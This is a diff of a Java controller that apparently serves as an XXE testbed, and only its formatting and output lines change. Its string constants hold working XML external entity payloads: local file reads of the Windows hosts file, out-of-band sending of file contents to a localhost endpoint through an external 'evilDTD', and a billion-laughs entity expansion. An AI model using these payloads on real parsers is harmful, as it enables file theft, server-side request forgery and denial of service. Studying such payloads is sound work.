@@ -26,7 +26,7 @@ public class XXETestController {
                     "<!ENTITY xxe2 SYSTEM \"http://localhost:8080/swagger-resources\" >" + "\r\n" +
                     "<!ENTITY send \"http://localhost:8080/XXE/sendDataElement?data=&file;&xxe1;\" >" + "\r\n" +
                     "<!ENTITY xxe3 SYSTEM \"http://localhost:8080/XXE/sendDataElement?data=&file;&xxe1;\" >" + "\r\n" +
-            " ]>" + "\r\n" +
+            "]>" + "\r\n" +
             "<example>" + "\r\n" +
                     "<file>&file;</file>" + "\r\n" +
                     "<xxe1>&xxe1;</xxe1>" + "\r\n" +
@@ -42,7 +42,7 @@ public class XXETestController {
                     "<!ENTITY % send0 SYSTEM \"http://localhost:8080/XXE/sendDataEntity?data=%file1;%file2;\" >" + "\r\n" +
                     "<!ENTITY % file2 \"file:///C:/Windows/System32/drivers/etc/hosts\" >" + "\r\n" +
                     "%send0;" + "\r\n" +
-            " ]>" + "\r\n" +
+            "]>" + "\r\n" +
             "<param>" + "\r\n" +
             "</param>";
 
@@ -62,7 +62,7 @@ public class XXETestController {
             "<!DOCTYPE param [" + "\r\n" +
                     "<!ENTITY % dtd SYSTEM \"http://localhost:8080/XXE/evilDTD\" >" + "\r\n" +
                     "%dtd; %send1;" + "\r\n" +
-            " ]>" + "\r\n" +
+            "]>" + "\r\n" +
             "<param>" + "\r\n" +
             "</param>";
 
@@ -70,7 +70,7 @@ public class XXETestController {
             "<!DOCTYPE param [" + "\r\n" +
                     "<!ENTITY % dtd SYSTEM \"http://localhost:8080/XXE/evilDTD\" >" + "\r\n" +
                     "%dtd; %fake; %send2;" + "\r\n" +
-            " ]>" + "\r\n" +
+            "]>" + "\r\n" +
             "<param>" + "\r\n" +
             "</param>";
 
@@ -78,7 +78,7 @@ public class XXETestController {
             "<!DOCTYPE param [" + "\r\n" +
                     "<!ENTITY % dtd SYSTEM \"http://localhost:8080/XXE/evilDTD\" >" + "\r\n" +
                     "%dtd; %fake; %send3;" + "\r\n" +
-            " ]>" + "\r\n" +
+            "]>" + "\r\n" +
             "<param>" + "\r\n" +
             "</param>";
 
@@ -101,7 +101,7 @@ public class XXETestController {
                     "<!ENTITY g \"&f;&f;&f;&f;&f;&f;&f;&f;&f;&f;\" >" + "\r\n" +
                     "<!ENTITY h \"&g;&g;&g;&g;&g;&g;&g;&g;&g;&g;\" >" + "\r\n" +
                     "<!ENTITY i \"&h;&h;&h;&h;&h;&h;&h;&h;&h;&h;\" >" + "\r\n" +
-            " ]>" + "\r\n" +
+            "]>" + "\r\n" +
             "<recursion>" + "\r\n" +
                     "<a>&a;</a>" + "\r\n" +
                     "<b>&b;</b>" + "\r\n" +
@@ -133,7 +133,6 @@ public class XXETestController {
         System.out.println("documentBuilder: " + documentBuilder.getClass().getName());
         Document document = documentBuilder.parse(new ByteArrayInputStream(inputXML.getBytes()));
         System.out.println("document: " + document.getClass().getName());
-        System.out.println("content: " + "\r\n" + document.getDocumentElement().getTextContent());
         StringWriter stringWriter = new StringWriter();
         TransformerFactory transformerFactory = TransformerFactory.newInstance();
         System.out.println("transformerFactory: " + transformerFactory.getClass().getName());
@@ -143,7 +142,7 @@ public class XXETestController {
         transformer.transform(new DOMSource(document), new StreamResult(stringWriter));
         String result = stringWriter.getBuffer().toString();
         System.out.println("result: " + "\r\n" + result);
-        return "输入用例：" + "\r\n" + inputXML + "\r\n" + "解析结果：" + "\r\n" + result;
+        return "输入用例 [" + inputXML.length() + "]：" + "\r\n" + inputXML + "\r\n" + "解析结果 [" + result.length() + "]：" + "\r\n" + result;
     }
 
     @ApiIgnore
@@ -151,11 +150,9 @@ public class XXETestController {
     public String sendDataElement(@RequestParam(defaultValue = "") String data, HttpServletRequest request) {
         data =
                 "<![CDATA[" + "\r\n" +
-                "<sendDataElement>" + "\r\n" +
-                        "[URL: " + request.getRequestURL() + "?" + request.getQueryString() +"]" + "\r\n" +
-                        "[data length: " + data.length() +"]" + "\r\n" +
+                        "URL: " + request.getRequestURL() + "?" + request.getQueryString() + "\r\n" +
+                        "data length: " + data.length() + "\r\n" +
                         data + "\r\n" +
-                "</sendDataElement>" + "\r\n" +
                 "]]>"
         ;
         System.err.println(data);
@@ -167,8 +164,8 @@ public class XXETestController {
     public String sendDataEntity(@RequestParam(defaultValue = "") String data, HttpServletRequest request) {
         data =
                 "<!ENTITY sendDataEntity \"" + "\r\n" +
-                        "[URL: " + request.getRequestURL() + "?" + request.getQueryString() +"]" + "\r\n" +
-                        "[data length: " + data.length() +"]" + "\r\n" +
+                        "URL: " + request.getRequestURL() + "?" + request.getQueryString() + "\r\n" +
+                        "data length: " + data.length() + "\r\n" +
                         data + "\r\n" +
                 "\" >"
         ;
